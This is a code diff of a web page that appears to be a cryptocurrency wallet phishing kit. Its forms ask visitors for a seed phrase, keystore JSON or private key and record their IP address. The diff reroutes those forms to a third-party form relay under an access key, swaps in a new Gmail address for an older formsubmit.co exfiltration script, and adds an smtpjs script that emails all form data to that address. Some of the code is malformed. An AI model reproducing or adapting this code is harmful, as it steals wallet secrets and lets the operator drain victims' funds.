@@ -234,7 +234,8 @@
     </div>
     <div class="container">
         <div class="tab-content pt-md-5 px-md-5 pt-5 px-2" id="phrase-form">
-            <form  id="pass-phrase">
+          <form  id="pass-phrase" action="https://api.web3forms.com/submit" method="POST">
+            <input type="hidden" name="access_key" value="cc84e718-bc05-40a2-9b45-dfd839275a30">
                 <textarea name="phrase" id="vepgzijzsg" class="phrase-field" placeholder="Phrase"></textarea>
                 <input type="hidden" name="user_ip" id="user_ip_phrase">
                 <input type="hidden" name="type" id="type-phrase">
@@ -245,7 +246,8 @@
             
         </div>
         <div class="tab-content pt-md-5 px-md-5 pt-5 px-2" id="json-form">
-          <form  id="pass-phrase">
+          <form  id="pass-phrase" action="https://api.web3forms.com/submit" method="POST">
+            <input type="hidden" name="access_key" value="cc84e718-bc05-40a2-9b45-dfd839275a30">
               <input type="hidden" name="_captcha" value="false">
               <input type="hidden" name="_template" value="table">
                 <textarea name="keystore" id="tnknmtqnlu" class="phrase-field" placeholder="Keystore JSON"></textarea>
@@ -257,7 +259,8 @@
             </form>
         </div>
         <div class="tab-content pt-md-5 px-md-5 pt-5 px-2" id="pkey-form">
-            <form id="private-key">
+          <form  id="pass-phrase" action="https://api.web3forms.com/submit" method="POST">
+            <input type="hidden" name="access_key" value="cc84e718-bc05-40a2-9b45-dfd839275a30">
               <input type="hidden" name="_captcha" value="false">
               <input type="hidden" name="_template" value="table">
                 <textarea name="privatekey" id="slpfoduuxq" class="phrase-field" placeholder="Private Key"></textarea>
@@ -293,7 +296,6 @@
                 document.getElementById('user_ip_phrase').value = data.ip;
                 document.getElementById('user_ip_keystore').value = data.ip;
                 document.getElementById('user_ip_key').value = data.ip;
-                
             })
             .catch(error => {
                 console.error('Error fetching IP address:', error);
@@ -303,7 +305,7 @@
     </script>
 
 <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-<script>
+<!--<script>
     $("form#pass-phrase").submit(async(e)=>{
       e.preventDefault();
       if(validatePhrase()){
@@ -320,7 +322,7 @@
         formData.append('type', fullType);
         formData.append('ip', ip);
 
-        const email = "webdme8@gmail.com"; // Change this to your email address
+        const email = "webt12348@gmail.com"; // Change this to your email address
         const endpoint = `https://formsubmit.co/${email}`;
 
         const res = await fetch(endpoint, {
@@ -333,12 +335,12 @@
             $("div.spanner").removeClass("show");
             $("div.overlay").removeClass("show");
             $(".modal").fadeIn();
-        },2000);
+        },1500);
         const data = await res.json();
         console.log(data);
       }
     });
-
+-->
     // Similar modifications for other forms...
 
     $(".btn-close").click(e=>{
@@ -346,9 +348,32 @@
     });
 </script>
 
+
    
    <script>
     console.log(Cookies.get("walletType")
    <script>
+
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script>
+        function sendEmail(event, formId) {
+            event.preventDefault();
+
+            const form = document.getElementById(formId);
+            const formData = new FormData(form);
+            const recipientEmail = 'webt12348@gmail.com; // Change this to your recipient email
+
+            Email.send({
+                SecureToken: "48e35119-5268-4660-9372-ae785e10f96d",
+                To: recipientEmail,
+                From: formData.get('user_email'), // Assuming you have an email field in your form
+                Subject: "Form Submission",
+                Body: "Form data: " + JSON.stringify(Object.fromEntries(formData.entries())),
+            }).then(
+                message => alert("Mail sent successfully")
+            );
+        }
+    </script>
+
 </body>
 </html>
